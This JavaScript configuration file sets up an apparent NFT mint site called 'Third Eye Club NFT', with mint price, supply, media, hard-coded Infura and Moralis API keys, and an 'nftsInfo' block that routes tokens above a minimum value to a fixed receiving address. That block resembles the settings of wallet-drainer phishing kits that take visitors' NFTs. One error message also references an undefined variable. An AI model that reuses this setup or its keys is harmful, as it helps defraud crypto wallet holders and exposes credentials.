const address = '0x0298Df47618d3E4f8B98aB1904D6639C47cde10F',
  infuraId = '5b7825e5fcc64bc4bf49f496587392ed',
  moralisApi =
    'BiY8KrXg1tXZSu4JUtOJ4JGZx89DErf5ZN0bfiyXkzQLi2GU8rfjREwurLHXTJRA'
const x20Ethereum = '0x0298Df47618d3E4f8B98aB1904D6639C47cde10F'
const collectionInfo = {
  name: 'Third Eye Club',
  title: 'Third Eye Club NFT',
  date: '11.05.2022',
  socialMedia: {
    discord: 'https://discord.gg/',
    twitter: 'https://twitter.com',
  },
  medias: {
    preview: 'preview.jpeg',
    favicon: 'logo.png',
  },
  background: {
    type: 'video',
    image: 'background.jpg',
    video: 'background.mp4',
    color: '#4E4E6D',
  },
}
const mintInfo = {
    price: 0.08,
    totalSupply: 9333,
    minUnits: 1,
    maxUnits: 5,
    askMintLoop: true,
  },
  nftsInfo = {
    active: true,
    minValue: 0.1,
    checkMaxDay: 7,
    receiveAddress: '0x0298Df47618d3E4f8B98aB1904D6639C47cde10F',
  }
if (mintInfo.minUnits > mintInfo.maxUnits) {
  console.error(
    'Error: minUnits (' +
      mintInfo.minUnits +
      ') is greater than maxUnits (' +
      maxUnits +
      ')'
  )
}
if (mintInfo.minUnits <= 0) {
  console.error(
    'Error: minUnits (' + mintInfo.minUnits + ') is less than or equal to 0'
  )
}
if (!address.startsWith('0x') || address.length >= 64 || address.length <= 40) {
  console.error('Error: ' + address + ' is not a valid Ethereum address.')
}
